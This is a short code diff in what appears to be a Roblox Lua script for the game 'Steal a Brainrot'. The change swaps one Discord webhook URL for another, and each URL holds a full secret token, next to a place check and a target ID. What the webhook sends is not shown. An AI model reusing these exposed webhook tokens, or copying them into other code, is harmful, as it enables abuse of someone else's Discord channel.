@@ -53,7 +53,7 @@ if not _llIsAllowedPlace() then
     return
 end
 
-local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1491958831977336892/VO_yHE5mL6dLnNYVb3Hq48_4pPa7dSBmY8qFCfCq1G5sxBRu8urHlL32WZdSYk18D264"
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1509365140511002645/AwKq8l0C9GGPMd51NeyHABdAg6dPlWlkK8Pnzw-GIdjPZgBaAxTWd09JtmxaGNhDDJaX"
 local GOOD_AVATAR = "https://cdn.grok.x.ai/attachments/sXvFE"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TARGET_ID = 5140915332
